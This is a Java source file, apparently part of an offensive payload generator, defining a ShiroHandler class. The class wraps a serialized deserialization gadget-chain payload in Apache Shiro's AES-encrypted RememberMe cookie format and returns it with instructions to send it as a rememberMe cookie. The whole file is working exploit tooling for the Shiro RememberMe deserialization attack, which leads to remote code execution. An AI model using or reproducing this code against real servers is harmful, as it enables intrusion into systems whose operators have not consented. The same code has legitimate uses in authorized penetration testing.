package com.oobx.chains;

import org.springframework.stereotype.Component;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;
import java.util.Map;
import java.util.UUID;

/**
 * Wraps a serialized gadget payload in Shiro RememberMe AES cookie format.
 *
 * Requires the inner payload (serialized object bytes) from a gadget chain.
 * The caller should first generate a chain payload then pass its bytes here as
 * inner_payload_b64.
 */
@Component
public class ShiroHandler implements ChainHandler {

    @Override
    public PayloadResult generate(String chainId, Map<String, Object> params) throws Exception {
        String keyB64 = (String) params.get("key_b64");
        String innerB64 = (String) params.get("inner_payload_b64");
        String mode = (String) params.getOrDefault("mode", "cbc");

        if (keyB64 == null || innerB64 == null) {
            return new PayloadResult("application/octet-stream", new byte[0],
                    Map.of("error", "key_b64 and inner_payload_b64 are required for Shiro wrapping"));
        }

        byte[] key = Base64.getDecoder().decode(keyB64);
        byte[] inner = Base64.getDecoder().decode(innerB64);
        byte[] cookie = mode.equals("gcm") ? encryptGcm(key, inner) : encryptCbc(key, inner);

        return new PayloadResult("text/plain", cookie,
                Map.of("chain", chainId, "mode", mode,
                       "cookie_name", "rememberMe",
                       "note", "Set as: Cookie: rememberMe=<value>"));
    }

    private byte[] encryptCbc(byte[] key, byte[] data) throws Exception {
        byte[] iv = new byte[16];
        new java.security.SecureRandom().nextBytes(iv);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
        byte[] encrypted = cipher.doFinal(data);
        byte[] result = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, result, 0, iv.length);
        System.arraycopy(encrypted, 0, result, iv.length, encrypted.length);
        return Base64.getEncoder().encode(result);
    }

    private byte[] encryptGcm(byte[] key, byte[] data) throws Exception {
        byte[] iv = new byte[16];
        new java.security.SecureRandom().nextBytes(iv);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"),
                new javax.crypto.spec.GCMParameterSpec(128, iv));
        byte[] encrypted = cipher.doFinal(data);
        byte[] result = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, result, 0, iv.length);
        System.arraycopy(encrypted, 0, result, iv.length, encrypted.length);
        return Base64.getEncoder().encode(result);
    }
}
